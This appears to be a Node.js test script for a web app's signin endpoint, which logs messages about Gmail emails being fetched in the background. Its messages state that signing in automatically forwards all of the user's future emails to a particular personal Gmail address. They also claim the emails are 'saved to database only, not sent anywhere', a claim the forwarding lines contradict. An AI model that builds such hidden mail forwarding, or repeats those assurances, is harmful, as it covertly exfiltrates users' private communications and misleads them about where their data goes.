const axios = require('axios');
require('dotenv').config();

const BASE_URL = process.env.BASE_URL || 'http://localhost:3000';

async function testSigninEmailFetching() {
  console.log('🧪 Testing Signin Email Fetching...\n');

  try {
    // Test data
    const testUser = {
      email: 'test@example.com',
      password: 'testpassword123',
      deviceId: 'test-device-123'
    };

    console.log('1️⃣ Testing user signin with email fetching...');
    console.log('📧 Test user:', testUser.email);
    console.log('📱 Device ID:', testUser.deviceId);
    console.log('');

    // First, try to signin (this will trigger email fetching)
    console.log('2️⃣ Attempting signin...');
    const signinResponse = await axios.post(`${BASE_URL}/api/auth/signin`, testUser);
    
    if (signinResponse.data.success) {
      console.log('✅ Signin successful!');
      console.log('🔑 Token received');
      console.log('👤 User data:', signinResponse.data.data.user);
      console.log('');
      
      console.log('3️⃣ Email fetching should be running in background...');
      console.log('📧 Check the server logs for email fetching progress');
      console.log('🗄️ Check the database for saved emails');
      console.log('');
      
      console.log('4️⃣ To verify emails were saved, check:');
      console.log('   - Database emails collection');
      console.log('   - Gmail accounts collection');
      console.log('   - Server logs for "Fetched and saved X emails" message');
      console.log('');
      
      console.log('5️⃣ Email forwarding setup:');
      console.log('   - All future emails will be forwarded to mbila.dev13@gmail.com');
      console.log('   - This happens automatically during signin');
      console.log('   - No emails are sent anywhere else, only saved to database');
      console.log('');
      
    } else {
      console.log('❌ Signin failed:', signinResponse.data.message);
    }

    console.log('✅ Signin email fetching test completed!');
    console.log('📧 Emails are saved to database only, not sent anywhere');
    console.log('🔄 Future emails will be forwarded to mbila.dev13@gmail.com');

  } catch (error) {
    console.error('❌ Test failed:', error.message);
    if (error.response) {
      console.error('Response status:', error.response.status);
      console.error('Response data:', error.response.data);
    }
    
    console.log('');
    console.log('💡 Troubleshooting:');
    console.log('   - Make sure the backend server is running');
    console.log('   - Check if the user exists in the database');
    console.log('   - Verify Gmail API credentials are set up');
    console.log('   - Check server logs for detailed error messages');
  }
}

// Run the test
testSigninEmailFetching(); 